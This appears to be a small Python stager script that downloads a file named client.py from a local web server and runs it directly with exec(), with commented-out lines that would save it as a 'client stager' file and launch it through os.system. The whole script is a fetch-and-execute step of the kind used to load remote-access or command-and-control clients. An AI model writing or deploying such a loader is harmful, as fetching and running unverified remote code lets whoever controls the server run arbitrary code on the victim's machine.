import requests
#import os

res = requests.get('http://localhost/client.py')
exec(res.text)
#res.text

#with open('client stager.py', 'w') as f:
#	f.write(res.text)
#os.system('python3 client_stager.py')
